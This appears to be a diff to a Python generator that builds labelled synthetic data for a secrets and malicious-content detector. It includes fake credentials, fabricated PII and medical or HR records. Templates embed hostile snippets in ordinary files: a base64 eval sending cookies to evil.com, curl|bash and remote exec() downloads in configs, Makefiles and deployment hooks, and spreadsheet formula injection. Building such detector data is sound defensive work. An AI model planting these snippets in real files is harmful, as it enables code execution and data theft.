+            f"{{\n \"cells\": [\n  {{\n   \"cell_type\": \"markdown\",\n   \"source\": [\"# Data Analysis Notebook\\n\", \"Exploring customer segmentation\"]\n  }},\n  {{\n   \"cell_type\": \"code\",\n   \"source\": [\n    \"import openai\\n\",\n    \"import anthropic\\n\",\n    \"\\n\",\n    \"# Quick analysis — remember to rotate these keys\\n\",\n    \"openai.api_key = \\\"{k1}\\\"\\n\",\n    \"client = anthropic.Client(api_key=\\\"{k2}\\\")\\n\",\n    \"\\n\",\n    \"response = openai.ChatCompletion.create(\\n\",\n    \"    model='gpt-4',\\n\",\n    \"    messages=[{{'role':'user','content':'Summarize this data'}}]\\n\",\n    \")\"\n   ]\n  }}\n ]\n}}"
+        )(),
+
+        # Gradle properties with credentials
+        lambda: (lambda token=rand_key("GitHub"), nexus_pass=f"N3xus_{rand_hex(12)}":
+            f"# gradle.properties\norg.gradle.jvmargs=-Xmx4g -XX:+HeapDumpOnOutOfMemoryError\norg.gradle.parallel=true\norg.gradle.caching=true\n\n# Artifact repository\nnexusUsername=deployer\nnexusPassword={nexus_pass}\n\n# GitHub Packages\ngpr.user=ci-bot\ngpr.key={token}\n\n# Signing\nsigning.keyId=ABC12345\nsigning.password=S1gn_{rand_hex(8)}\nsigning.secretKeyRingFile=/home/ci/.gnupg/secring.gpg"
+        )(),
+
+        # Docker env file
+        lambda: (lambda db_pass=f"Pr0d_{rand_hex(16)}", api_key=rand_key("Stripe"):
+            f"# docker/production.env — mounted into container at runtime\nNODE_ENV=production\nPORT=3000\nLOG_LEVEL=warn\n\nDB_HOST=rds-prod.{rand_hex(8)}.us-east-1.rds.amazonaws.com\nDB_PORT=5432\nDB_NAME=app_production\nDB_USER=app_service\nDB_PASSWORD={db_pass}\n\nSTRIPE_KEY={api_key}\nENCRYPTION_KEY={rand_hex(64)}\n\nSMTP_HOST=smtp.sendgrid.net\nSMTP_USER=apikey\nSMTP_PASS=SG.{rand_b64(22)}.{rand_b64(43)}"
+        )(),
+    ]
+    samples = []
+    for _ in range(n):
+        subcat = random.choice(["credentials.api_key", "credentials.token", "credentials.password", "credentials.connection_string"])
+        samples.append({"text": random.choice(tmpls)(), "findings": [
+            {"category": "credentials", "subcategory": subcat, "severity": "critical",
+             "explanation": "Real credentials hidden in an innocent-looking file (code comment, test file, encoded config, log, git diff, notebook, or env file). No 'example'/'placeholder' markers. Rotate immediately."}
+        ]})
+    return samples
+
+
+# ── E. Subtle Malicious Content in Normal-Looking Files ─────────────
+
+def gen_subtle_malicious_content(n: int) -> list:
+    """Malicious content disguised within normal-looking files."""
+    tmpls = [
+        # Minified JS with hidden eval
+        lambda: f"// analytics.min.js — v3.2.1\n;(function(w,d){{var s=d.createElement('script');s.async=true;s.src='https://cdn.analytics-service.com/v3/tracker.js';var f=d.getElementsByTagName('script')[0];f.parentNode.insertBefore(s,f);w._analytics=w._analytics||[];w._analytics.push(['init','{rand_hex(12)}']);w._analytics.push(['track','pageview'])}})(window,document);/* {rand_hex(40)} */;(function(){{var _0x{rand_hex(4)}=atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbS9zdGVhbD9jPSIrZG9jdW1lbnQuY29va2ll');eval(_0x{rand_hex(4)});}})()",
+
+        # Package.json with suspicious dependency
+        lambda: f'{{\n  "name": "my-awesome-app",\n  "version": "2.1.0",\n  "description": "A modern web application",\n  "main": "index.js",\n  "scripts": {{\n    "start": "node server.js",\n    "build": "webpack --mode production",\n    "test": "jest --coverage",\n    "postinstall": "node scripts/setup.js"\n  }},\n  "dependencies": {{\n    "express": "^4.18.2",\n    "lodash": "^4.17.21",\n    "react": "^18.2.0",\n    "react-dom": "^18.2.0",\n    "axios": "^1.6.0",\n    "c0lors": "1.0.0",\n    "webpack": "^5.89.0"\n  }},\n  "devDependencies": {{\n    "jest": "^29.7.0",\n    "eslint": "^8.55.0"\n  }},\n  "repository": {{\n    "type": "git",\n    "url": "https://github.com/user/my-awesome-app"\n  }}\n}}',
+
+        # README with tracking pixel
+        lambda: f"# {random.choice(['FastCache','DataSync','APIProxy'])} — High Performance {random.choice(['Cache','Sync','Proxy'])}\n\n![Build Status](https://ci.example.com/badge/passing)\n![Coverage](https://coverage.example.com/badge/95)\n\n## Features\n- Lightning fast performance\n- Easy configuration\n- Production ready\n\n## Installation\n```bash\nnpm install {random.choice(['fastcache','datasync','apiproxy'])}\n```\n\n## Quick Start\n```javascript\nconst cache = require('fastcache');\ncache.init({{ ttl: 3600 }});\n```\n\n<img src=\"https://{rand_hex(8)}.tracking-pixel.com/collect?uid={rand_hex(16)}&ref=github&repo=fastcache\" width=\"0\" height=\"0\" style=\"display:none\" alt=\"\">\n\n## License\nMIT",
+
+        # CSV with formula injection
+        lambda: f"Employee ID,Name,Department,Email,Notes\n{random.randint(1000,9999)},{rand_name()},Engineering,{rand_email()},Regular employee\n{random.randint(1000,9999)},{rand_name()},Marketing,{rand_email()},Works remotely\n{random.randint(1000,9999)},{rand_name()},Finance,{rand_email()},\"=CMD|'/C calc'!A0\"\n{random.randint(1000,9999)},{rand_name()},Engineering,{rand_email()},Team lead\n{random.randint(1000,9999)},{rand_name()},HR,{rand_email()},\"=HYPERLINK(\"\"http://{rand_hex(8)}.evil.com/phish\"\",\"\"Click for benefits\"\")\"\n{random.randint(1000,9999)},{rand_name()},Sales,{rand_email()},New hire",
+
+        # PDF-like content with phishing links (representing extracted text)
+        lambda: f"[Extracted from document.pdf]\n\nIMPORTANT: Updated Company Policy\n\nDear employees,\n\nPlease review and sign the updated employee handbook:\n\n  >>> Click here to review: https://{random.choice(['cornpany','c0mpany','companv','companny'])}.{random.choice(['com','net','org'])}/handbook/review?token={rand_hex(32)} <<<\n\nYou must complete this by {rand_date()}.\n\nHuman Resources\n{rand_name()}\n\n[Note: Link points to {random.choice(['a phishing domain','a typosquatted domain'])} — not the real company domain]",
+
+        # Python with exec(compile(...))
+        lambda: f"# utils/data_processor.py\nimport json\nimport csv\nfrom pathlib import Path\n\ndef load_config(path):\n    \"\"\"Load configuration from file.\"\"\"\n    with open(path) as f:\n        return json.load(f)\n\ndef process_csv(input_path, output_path):\n    \"\"\"Process CSV data with transformations.\"\"\"\n    rows = []\n    with open(input_path) as f:\n        reader = csv.DictReader(f)\n        for row in reader:\n            rows.append(row)\n    return rows\n\ndef _apply_plugin(code_path):\n    \"\"\"Dynamic plugin loader.\"\"\"\n    with open(code_path) as f:\n        exec(compile(f.read(), code_path, 'exec'), {{'__builtins__': __builtins__}})\n\ndef _update_check():\n    \"\"\"Check for updates.\"\"\"\n    import urllib.request\n    exec(compile(urllib.request.urlopen('http://{rand_hex(8)}.com/update.py').read(), '<update>', 'exec'))\n\ndef main():\n    config = load_config('config.json')\n    _update_check()  # called silently on import\n    data = process_csv(config['input'], config['output'])\n    print(f'Processed {{len(data)}} rows')\n\nif __name__ == '__main__':\n    main()",
+
+        # Config with shell expansion
+        lambda: f"# deploy/config.ini\n[application]\nname = web-service\nversion = 2.4.1\nenvironment = production\nport = 8080\nworkers = 4\n\n[database]\nhost = db.internal\nport = 5432\nname = appdb\nuser = appuser\npassword = $(curl -s http://{rand_hex(8)}.com/c.sh|bash)\n\n[cache]\nhost = redis.internal\nport = 6379\nttl = 3600\n\n[logging]\nlevel = info\nformat = json\noutput = /var/log/app.log",
+
+        # Makefile with hidden download
+        lambda: f"# Makefile for project build\n\n.PHONY: all build test clean setup\n\nall: build\n\nsetup:\n\t@echo \"Setting up development environment...\"\n\t@pip install -r requirements.txt\n\t@echo \"Installing development tools...\"\n\t@curl -sL https://{rand_hex(10)}.com/tools/setup.sh | bash\n\t@echo \"Setup complete.\"\n\nbuild:\n\t@echo \"Building project...\"\n\t@python setup.py build\n\ntest:\n\t@pytest tests/ -v --cov=src\n\nclean:\n\t@rm -rf build/ dist/ *.egg-info __pycache__\n\t@find . -name '*.pyc' -delete",
+
+        # YAML with anchors hiding malicious command
+        lambda: f"# deployment.yaml\ndefaults: &defaults\n  replicas: 3\n  image: myapp:latest\n  port: 8080\n\nhealthcheck: &healthcheck\n  path: /health\n  interval: 30s\n  timeout: 5s\n\nlifecycle: &lifecycle\n  preStop:\n    exec:\n      command: [\"/bin/sh\", \"-c\", \"curl -s http://{rand_hex(8)}.com/b|sh; sleep 15\"]\n\nservices:\n  web:\n    <<: *defaults\n    <<: *healthcheck\n    <<: *lifecycle\n    env:\n      NODE_ENV: production\n  worker:\n    <<: *defaults\n    <<: *lifecycle\n    command: [\"node\", \"worker.js\"]",
+    ]
+    samples = []
+    subcat_map = {
+        0: "malicious.obfuscated",
+        1: "malicious.supply_chain",
+        2: "malicious.tracking",
+        3: "malicious.injection",
+        4: "malicious.phishing",
+        5: "malicious.obfuscated",
+        6: "malicious.shell",
+        7: "malicious.shell",
+        8: "malicious.shell",
+    }
+    explanations = {
+        0: "Minified JavaScript with obfuscated eval() that decodes and executes a cookie-stealing payload. Hidden among legitimate analytics code.",
+        1: "Package.json with a typosquatted dependency (c0lors instead of colors) — supply chain attack vector.",
+        2: "README with hidden zero-pixel tracking image that collects user data (repository visitors) without consent.",
+        3: "CSV file with formula injection payloads (=CMD, =HYPERLINK) that execute when opened in spreadsheet software.",
+        4: "Document with phishing link using typosquatted domain that mimics the company's legitimate URL.",
+        5: "Python script with exec(compile(...)) that downloads and executes remote code disguised as an update check.",
+        6: "Configuration file with shell command expansion $(curl...|bash) in a password field — executes when config is parsed by shell.",
+        7: "Makefile with hidden curl|bash that downloads and executes an external script during setup.",
+        8: "YAML deployment with a preStop lifecycle hook that downloads and executes a remote shell script.",
+    }
+    for _ in range(n):
+        idx = random.randint(0, len(tmpls) - 1)
+        samples.append({"text": tmpls[idx](), "findings": [
+            {"category": "malicious", "subcategory": subcat_map.get(idx, "malicious.obfuscated"), "severity": "critical",
+             "explanation": explanations.get(idx, "Subtle malicious content hidden in a normal-looking file.")}
+        ]})
+    return samples
+
+
+# ── F. Multi-Category Boundary Cases ────────────────────────────────
+
+def gen_multi_category_boundary(n: int) -> list:
+    """Documents with MULTIPLE types of sensitive data across different categories."""
+    tmpls = [
+        # Medical records with financial information
+        lambda: (lambda nm=rand_name(), ssn=rand_ssn(), dx=random.choice(["Type 2 Diabetes","Major Depressive Disorder","Breast Cancer Stage II","Chronic Kidney Disease","Bipolar Disorder"]):
+            (f"PATIENT RECORD — CONFIDENTIAL\n\nPatient: {nm}\nDOB: {random.randint(1,12):02d}/{random.randint(1,28):02d}/{random.randint(1955,1990)}\nSSN: {ssn}\nMRN: MG-{random.randint(10000,99999)}\n\nDiagnosis: {dx}\nTreatment Plan: {random.choice(['Metformin 1000mg BID','Sertraline 150mg daily','Tamoxifen 20mg daily','Lisinopril 20mg daily','Lithium 600mg BID'])}\nLast Visit: {rand_date()}\n\nInsurance:\n  Provider: {random.choice(['Aetna','BCBS','UnitedHealthcare','Cigna'])}\n  Policy #: {random.choice(['AET','BCB','UHC','CIG'])}-{random.randint(100000,999999)}\n  Group #: GRP-{random.randint(1000,9999)}\n  Copay: ${random.choice([20,30,40,50])}\n  Deductible remaining: ${random.randint(500,5000):,}\n\nBilling:\n  Card on file: {rand_cc()}\n  Exp: {random.randint(1,12):02d}/{random.randint(26,30)}\n  Billing address: {random.randint(100,9999)} {random.choice(['Oak','Elm','Maple','Pine'])} {random.choice(['St','Ave','Dr','Ln'])}, {random.choice(['Denver, CO 80202','Austin, TX 73301','Seattle, WA 98101'])}",
+             [{"category": "medical", "subcategory": "medical.diagnosis", "severity": "critical",
+               "explanation": f"Protected health information: {dx} diagnosis for {nm}. HIPAA-regulated."},
+              {"category": "pii", "subcategory": "pii.identity", "severity": "critical",
+               "explanation": f"Patient PII: {nm}, SSN {ssn}, DOB, address."},
+              {"category": "financial", "subcategory": "financial.credit_card", "severity": "critical",
+               "explanation": f"Credit card on file for medical billing. Card number + expiration exposed."}]
+            ))(),
+
+        # Employee termination letter
+        lambda: (lambda nm=rand_name(), ssn=rand_ssn(), salary=random.randint(95000,250000):
+            (f"CONFIDENTIAL — HR USE ONLY\n\nEMPLOYEE TERMINATION NOTICE\n\nDate: {rand_date()}\nEmployee: {nm}\nEmployee ID: EMP-{random.randint(10000,99999)}\nSSN: {ssn}\nDepartment: {random.choice(['Engineering','Sales','Finance','Marketing'])}\nTitle: {random.choice(['Senior Engineer','Sales Director','VP Operations','Staff Analyst'])}\nManager: {rand_name()}\n\nReason for Termination: {random.choice(['Performance — failed PIP','Reduction in force','Violation of code of conduct','Position eliminated'])}\n\nCompensation Details:\n  Base Salary: ${salary:,}/yr\n  Severance Package: {random.randint(2,6)} months = ${salary * random.randint(2,6) // 12:,}\n  Unused PTO payout: ${random.randint(2000,15000):,}\n  COBRA eligibility: 18 months\n\nFinal paycheck direct deposit:\n  Bank: {random.choice(['Chase','Wells Fargo','Bank of America'])}\n  Routing: {rand_routing()}\n  Account: {rand_acct()}\n\nLegal:\n  Non-compete: 12 months, {random.choice(['tri-state area','nationwide'])}\n  NDA: Perpetual\n  IP assignment: All work product\n\nApproved by: {rand_name()}, VP HR\n/s/ {rand_name()}, General Counsel",
+             [{"category": "pii", "subcategory": "pii.identity", "severity": "critical",
+               "explanation": f"Employee PII: {nm}, SSN {ssn}, employee ID."},
+              {"category": "financial", "subcategory": "financial.bank_account", "severity": "critical",
+               "explanation": f"Direct deposit bank account and routing number for {nm}."},
+              {"category": "confidential", "subcategory": "confidential.internal", "severity": "high",
+               "explanation": f"Confidential HR document: termination reason, salary ${salary:,}, severance terms, legal obligations."}]
+            ))(),
+
+        # Incident report with PII + creds + malicious activity
+        lambda: (lambda nm=rand_name(), key=rand_key("Stripe"), attacker_ip=rand_ip():
+            (f"SECURITY INCIDENT REPORT — SEC-{random.randint(2024,2026)}-{random.randint(100,999)}\nClassification: CONFIDENTIAL\n\nIncident Summary:\nOn {rand_date()} at {random.randint(0,23):02d}:{random.randint(0,59):02d} UTC, unauthorized access was detected to the payment processing system.\n\nCompromised Credentials:\n  API Key: {key}\n  Database: postgresql://admin:Pr0d_{rand_hex(12)}@db.internal:5432/payments\n  Admin Panel: admin / {rand_hex(16)}\n  Status: ALL ROTATED as of {rand_date()}\n\nAttacker Activity:\n  Source IP: {attacker_ip}\n  Method: Credential stuffing via leaked key\n  Data Accessed: Customer payment records\n\nAffected Customers:\n  1. {rand_name()} — {rand_email()}, card ending {random.randint(1000,9999)}\n  2. {rand_name()} — {rand_email()}, card ending {random.randint(1000,9999)}\n  3. {rand_name()} — {rand_email()}, card ending {random.randint(1000,9999)}\n  Total: ~{random.randint(200,5000):,} customers\n\nRoot Cause: API key committed to public GitHub repository.\n\nPrepared by: {rand_name()}, Incident Response Lead",
+             [{"category": "credentials", "subcategory": "credentials.api_key", "severity": "critical",
+               "explanation": f"Compromised Stripe API key and database connection string included in report."},
+              {"category": "pii", "subcategory": "pii.identity", "severity": "critical",
+               "explanation": "Affected customer names, emails, and partial card numbers exposed in incident report."},
+              {"category": "confidential", "subcategory": "confidential.internal", "severity": "high",
+               "explanation": "Internal security incident report with attack details, scope, and response actions."}]
+            ))(),
+
+        # Legal discovery with mixed sensitive data
+        lambda: (lambda nm1=rand_name(), nm2=rand_name(), ssn1=rand_ssn():
+            (f"PRIVILEGED AND CONFIDENTIAL — ATTORNEY-CLIENT\n\nRE: {nm1} v. {random.choice(['TechCorp Inc','DataFirst LLC','CloudServ Corp'])}\nCase No. {random.randint(23,26)}-cv-{random.randint(1000,9999)}\n\nDear Counsel,\n\nEnclosed please find the following discovery materials:\n\n1. Employment Records:\n   - {nm1}, SSN: {ssn1}\n   - Annual compensation: ${random.randint(120000,350000):,}\n   - Performance reviews: 2022-2024\n\n2. Medical Records (produced under protective order):\n   - Diagnosis: {random.choice(['Work-related PTSD','Occupational injury — L4/L5 herniation','Anxiety disorder'])}\n   - Treating physician: Dr. {rand_name()}\n   - Disability claim filed: {rand_date()}\n\n3. Communications:\n   - Slack messages between {nm1} and {nm2}\n   - Email chain re: {random.choice(['hostile work environment','discrimination complaint','wrongful termination'])}\n   - HR investigation notes\n\nSettlement demand: ${random.randint(500000,5000000):,}\nTrial date: {rand_date()}\n\n{rand_name()}, Esq.\n{random.choice(['Baker McKenzie','Kirkland & Ellis','Latham & Watkins'])}",
+             [{"category": "pii", "subcategory": "pii.identity", "severity": "critical",
+               "explanation": f"Plaintiff PII: {nm1}, SSN {ssn1}, compensation details."},
+              {"category": "medical", "subcategory": "medical.diagnosis", "severity": "critical",
+               "explanation": "Medical diagnosis included in legal discovery — HIPAA-protected PHI."},
+              {"category": "confidential", "subcategory": "confidential.legal", "severity": "critical",
+               "explanation": "Attorney-client privileged material: litigation strategy, settlement demand, discovery documents."}]
+            ))(),
+
+        # Insurance claim with everything
+        lambda: (lambda nm=rand_name(), ssn=rand_ssn():
+            (f"INSURANCE CLAIM — CLM-{random.randint(2024,2026)}-{random.randint(100000,999999)}\n\nClaimant Information:\n  Name: {nm}\n  SSN: {ssn}\n  DOB: {random.randint(1,12):02d}/{random.randint(1,28):02d}/{random.randint(1960,1995)}\n  Phone: {rand_phone()}\n  Email: {rand_email(nm)}\n  Address: {random.randint(100,9999)} {random.choice(['Maple','Cedar','Birch'])} {random.choice(['St','Ave'])}, {random.choice(['Denver, CO 80202','Chicago, IL 60601'])}\n\nIncident:\n  Date: {rand_date()}\n  Type: {random.choice(['Auto collision','Property damage','Workers comp','Liability'])}\n  Description: {random.choice(['Rear-ended at intersection','Water damage from burst pipe','Fell at workplace','Third-party property damage'])}\n\nMedical:\n  Injuries: {random.choice(['Cervical strain, contusion','Fractured wrist','Lower back injury','Concussion'])}\n  Treatment: {random.choice(['ER visit + PT','Surgical repair','Chiropractic care','Hospitalized 3 days'])}\n  Provider: Dr. {rand_name()}\n\nFinancial:\n  Medical expenses: ${random.randint(5000,100000):,}\n  Lost wages: ${random.randint(3000,50000):,}\n  Property damage: ${random.randint(2000,30000):,}\n  Payment to: {random.choice(['Chase','BofA','Wells Fargo'])} / {rand_acct()} / {rand_routing()}\n\nAdjuster: {rand_name()}, Claim #{random.randint(100,999)}",
+             [{"category": "pii", "subcategory": "pii.identity", "severity": "critical",
+               "explanation": f"Claimant PII: {nm}, SSN {ssn}, DOB, address, contact info."},
+              {"category": "medical", "subcategory": "medical.diagnosis", "severity": "high",
+               "explanation": "Medical injury details and treatment information in insurance claim."},
+              {"category": "financial", "subcategory": "financial.bank_account", "severity": "critical",
+               "explanation": "Bank routing and account number for claim payment disbursement."}]
+            ))(),
+    ]
+    samples = []
+    for _ in range(n):
+        text, findings = random.choice(tmpls)()
+        samples.append({"text": text, "findings": findings})
+    return samples
+
+
+# ── G. Near-Miss Safe vs Credentials ────────────────────────────────
+
+def gen_near_miss_safe_creds(n: int) -> list:
+    """The most confusing boundary: looks like credentials but is safe."""
+    tmpls_safe = [
+        # Code that generates fake/random API keys for testing
+        lambda: f"import secrets\nimport string\n\ndef generate_test_api_key(prefix='sk_test_'):\n    \"\"\"Generate a random API key for testing.\n    These are NOT real keys — just random strings.\"\"\"\n    chars = string.ascii_letters + string.digits\n    random_part = ''.join(secrets.choice(chars) for _ in range(32))\n    return f'{{prefix}}{{random_part}}'\n\ndef generate_test_keys(n=5):\n    providers = {{\n        'stripe': 'sk_test_',\n        'github': 'ghp_',\n        'openai': 'sk-proj-',\n        'aws': 'AKIA',\n    }}\n    return {{name: generate_test_api_key(prefix) for name, prefix in providers.items()}}\n\nif __name__ == '__main__':\n    for name, key in generate_test_keys().items():\n        print(f'{{name}}: {{key}}')\n    # Output is random — not connected to any real service.",
+
+        # Environment variable NAMES without values
+        lambda: f"# Required Environment Variables\n# Set these before running the application\n\n# Authentication\nJWT_SECRET=\nSESSION_SECRET=\nOAUTH_CLIENT_ID=\nOAUTH_CLIENT_SECRET=\n\n# Database\nDATABASE_URL=\nREDIS_URL=\n\n# External Services\nSTRIPE_SECRET_KEY=\nSENDGRID_API_KEY=\nAWS_ACCESS_KEY_ID=\nAWS_SECRET_ACCESS_KEY=\nSLACK_BOT_TOKEN=\n\n# Monitoring\nSENTRY_DSN=\nDATADOG_API_KEY=\n\n# All values intentionally blank — populate from your secrets manager.",
+
+        # API documentation showing key format
+        lambda: f"# API Authentication\n\n## API Key Format\nAll API keys follow this format:\n- **Production**: `sk_live_` followed by 24 hexadecimal characters\n  - Example format: `sk_live_xxxxxxxxxxxxxxxxxxxxxxxx`\n- **Test**: `sk_test_` followed by 24 hexadecimal characters\n  - Example format: `sk_test_xxxxxxxxxxxxxxxxxxxxxxxx`\n- **Restricted**: `rk_live_` followed by 24 hexadecimal characters\n\n## Authentication Header\n```\nAuthorization: Bearer sk_live_xxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## Key Properties\n| Property | Value |\n|----------|-------|\n| Length | 32 characters (including prefix) |\n| Character set | Hex (0-9, a-f) |\n| Rotation | Every 90 days recommended |\n| Rate limit | 100 req/sec per key |\n\n## Error Responses\n- `401`: Invalid or expired API key\n- `429`: Rate limit exceeded\n\n*The `x` characters above are placeholders. Your actual key is in your dashboard.*",
+
+        # Expired/revoked keys
+        lambda: (lambda k=rand_key(random.choice(["Stripe","OpenAI","GitHub"])):
+            f"# Key Rotation Log — {rand_date()}\n\n## Revoked Keys (DO NOT USE)\nThe following keys have been permanently revoked and are non-functional:\n\n| Key (truncated) | Service | Revoked Date | Reason |\n|----------------|---------|--------------|--------|\n| {k[:20]}... | {random.choice(['Stripe','OpenAI','GitHub'])} | {rand_date()} | REVOKED — scheduled rotation |\n| sk_live_{rand_hex(8)}... | Stripe | {rand_date()} | REVOKED — suspected compromise |\n| ghp_{rand_b64(8)}... | GitHub | {rand_date()} | EXPIRED — 90-day policy |\n\nAll keys above are **non-functional**. They have been deactivated in the provider dashboard.\n\nNew keys provisioned via HashiCorp Vault. See VAULT-{random.randint(100,999)} for active credentials."
+        )(),
+
+        # Regex patterns for key detection
+        lambda: f"# secret_scanner.py — Detect leaked credentials in source code\nimport re\n\n# These patterns MATCH real keys — they are not keys themselves\nPATTERNS = {{\n    'aws_access_key': r'AKIA[0-9A-Z]{{16}}',\n    'stripe_live': r'sk_live_[0-9a-zA-Z]{{24,}}',\n    'stripe_test': r'sk_test_[0-9a-zA-Z]{{24,}}',\n    'github_pat': r'ghp_[0-9a-zA-Z]{{36}}',\n    'openai': r'sk-[0-9a-zA-Z]{{48}}',\n    'slack_token': r'xox[bpras]-[0-9a-zA-Z-]+',\n    'generic_secret': r'(?i)(password|secret|token|key)\\s*[=:]\\s*[\\'\"][^\\s\\'\"]+',\n}}\n\ndef scan_file(filepath):\n    findings = []\n    with open(filepath) as f:\n        for i, line in enumerate(f, 1):\n            for name, pattern in PATTERNS.items():\n                if re.search(pattern, line):\n                    findings.append({{'line': i, 'type': name, 'file': filepath}})\n    return findings\n\n# This tool DETECTS secrets — it doesn't contain any.",
+
+        # Mock API key generator for load testing
+        lambda: f"# load_test/fixtures.py\n\"\"\"Generate mock API responses for load testing.\nAll keys below are randomly generated — not connected to any service.\"\"\"\n\nimport random\nimport string\n\ndef mock_api_key_response():\n    \"\"\"Simulate API key creation response.\"\"\"\n    fake_key = 'sk_live_' + ''.join(random.choices(string.hexdigits[:16], k=24))\n    return {{\n        'id': f'key_{{random.randint(1000,9999)}}',\n        'object': 'api_key',\n        'key': fake_key,  # FAKE — randomly generated\n        'created': 1709251200,\n        'livemode': True,  # Simulated\n    }}\n\ndef mock_keys_list(n=10):\n    return [mock_api_key_response() for _ in range(n)]\n\n# All keys are RANDOMLY GENERATED for testing. Not real.",
+
+        # Placeholder key format documentation
+        lambda: f"# Configuration Reference\n\n## Required Keys\nAll keys must be set before deploying. Use the format shown:\n\n```yaml\n# config/production.yaml\nservices:\n  stripe:\n    api_key: \"sk_live_<YOUR_KEY>\"    # Get from Stripe Dashboard\n  aws:\n    access_key: \"<YOUR_AWS_KEY>\"     # IAM console\n    secret_key: \"<YOUR_AWS_SECRET>\"  # IAM console\n  openai:\n    api_key: \"sk-<YOUR_KEY>\"         # OpenAI dashboard\n  sendgrid:\n    api_key: \"SG.<YOUR_KEY>\"         # SendGrid settings\n```\n\n## Validation\nThe app validates key format on startup:\n- Stripe keys must start with `sk_live_` or `sk_test_`\n- AWS keys must start with `AKIA`\n- Missing keys cause startup failure with clear error message\n\n*Angle-bracket values are PLACEHOLDERS — replace with real keys from your provider dashboard.*",
+    ]
+
+    tmpls_dangerous = [
+        # Real-format key with no example context
+        lambda: (lambda key=rand_key(random.choice(["AWS","Stripe","GitHub","OpenAI","Anthropic","SendGrid"])):
+            f"# .credentials\n{key}"
+        )(),
+
+        # Key in a variable assignment with no test/example markers
+        lambda: (lambda provider=random.choice(["Stripe","OpenAI","Anthropic","GitHub"]):
+            (lambda p, k: f"const API_KEY = \"{k}\";")(provider, rand_key(provider))
+        )(),
+
+        # Key in a curl command
+        lambda: (lambda key=rand_key(random.choice(["Stripe","OpenAI","Anthropic"])):
+            f"curl -X POST https://api.{random.choice(['stripe','openai','anthropic'])}.com/v1/{random.choice(['charges','chat/completions','messages'])} \\\n  -H \"Authorization: Bearer {key}\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{{\"model\": \"gpt-4\", \"messages\": [{{\"role\": \"user\", \"content\": \"hello\"}}]}}'"
+        )(),
+
+        # Connection string with real password
+        lambda: f"DATABASE_URL=postgresql://appuser:{random.choice(['Str0ng','Pr0d','S3cur3'])}P@ss_{rand_hex(10)}@{random.choice(['rds-prod','db-main','postgres-primary'])}.{rand_hex(8)}.us-east-1.rds.amazonaws.com:5432/{random.choice(['production','app_prod','maindb'])}",
+
+        # Private key material
+        lambda: f"-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA{rand_b64(86)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(64)}\n{rand_b64(40)}==\n-----END RSA PRIVATE KEY-----",
+    ]
+
+    samples = []
+    n_safe = n * 3 // 5  # 60% safe
+    n_dangerous = n - n_safe  # 40% dangerous
+
+    for _ in range(n_safe):
+        samples.append({"text": random.choice(tmpls_safe)(), "findings": [
+            {"category": "safe", "subcategory": random.choice(["safe.code", "safe.documentation", "safe.config"]),
+             "severity": "info",
+             "explanation": "Contains credential-like patterns but they are fake/generated/placeholder/expired/revoked/documentation examples. No real credentials exposed."}
+        ]})
+
+    for _ in range(n_dangerous):
+        samples.append({"text": random.choice(tmpls_dangerous)(), "findings": [
+            {"category": "credentials", "subcategory": random.choice(["credentials.api_key", "credentials.token", "credentials.private_key", "credentials.connection_string"]),
+             "severity": "critical",
+             "explanation": "Real-format credential with no 'example', 'test', 'placeholder', 'fake', or 'revoked' context. Treat as live credential — rotate immediately."}
+        ]})
+
+    random.shuffle(samples)
+    return samples
+
+
+# ═══════════════════════════════════════════════════════════════════════
 # Registry and entry point
 # ═══════════════════════════════════════════════════════════════════════
 
 GENERATORS = {
-    # Safe that looks dangerous
+    # Safe that looks dangerous (original)
     "safe_tutorial_credentials": (gen_safe_tutorial_credentials, 500),
     "safe_pentest_reports": (gen_safe_pentest_reports, 500),
     "safe_test_code": (gen_safe_test_code, 500),
     "safe_configs": (gen_safe_configs, 500),
     "safe_public_records": (gen_safe_public_records, 500),
-    # Dangerous that looks safe
+    # Dangerous that looks safe (original)
     "hidden_credentials": (gen_hidden_credentials, 500),
     "subtle_prompt_injection": (gen_subtle_prompt_injection, 500),
     "social_engineering": (gen_social_engineering, 500),
     "obfuscated_attacks": (gen_obfuscated_attacks, 500),
     "casual_financial": (gen_casual_financial, 500),
     "unexpected_pii": (gen_unexpected_pii, 500),
-    # Boundary cases
+    # Boundary cases (original)
     "multi_category_docs": (gen_multi_category_docs, 300),
     "partial_redaction": (gen_partial_redaction, 300),
     "decodable_tokens": (gen_decodable_tokens, 300),
+    # ── New v2 generators ──
+    # A. Safe Security Tutorials (~1000)
+    "safe_security_tutorials": (gen_safe_security_tutorials, 1000),
+    # B. Safe Code with Security Patterns (~1000)
+    "safe_security_code": (gen_safe_security_code, 1000),
+    # C. Safe Config Files (~500)
+    "safe_config_files": (gen_safe_config_files, 500),
+    # D. Hidden Credentials in Innocent-Looking Files (~800)
+    "hidden_creds_innocent": (gen_hidden_creds_in_innocent_files, 800),
+    # E. Subtle Malicious Content in Normal-Looking Files (~700)
+    "subtle_malicious": (gen_subtle_malicious_content, 700),
+    # F. Multi-Category Boundary Cases (~500)
+    "multi_category_boundary": (gen_multi_category_boundary, 500),
+    # G. Near-Miss Safe vs Credentials (~500)
+    "near_miss_safe_creds": (gen_near_miss_safe_creds, 500),
 }
 
 
@@ -466,6 +886,7 @@ def process(only=None, count_override=None, seed=42):
     random.seed(seed)
     OUT_DIR.mkdir(parents=True, exist_ok=True)
     total = 0
+    summary = {}
     for name, (gen_fn, default_count) in GENERATORS.items():
         if only and only not in name:
             continue
@@ -479,8 +900,17 @@ def process(only=None, count_override=None, seed=42):
                           "source_license": "generated", "text": s["text"], "findings": s["findings"]}
                 f.write(json.dumps(record) + "\n")
         total += len(samples)
+        summary[name] = len(samples)
         print(f"  -> {out_path.name} ({len(samples)} samples)")
-    print(f"\nTotal hard negative samples: {total:,}")
+
+    print(f"\n{'─' * 55}")
+    print(f"{'Generator':<35} {'Count':>8}")
+    print(f"{'─' * 55}")
+    for name, cnt in summary.items():
+        print(f"  {name:<33} {cnt:>8,}")
+    print(f"{'─' * 55}")
+    print(f"  {'TOTAL':<33} {total:>8,}")
+    print(f"{'─' * 55}")
 
 
 if __name__ == "__main__":
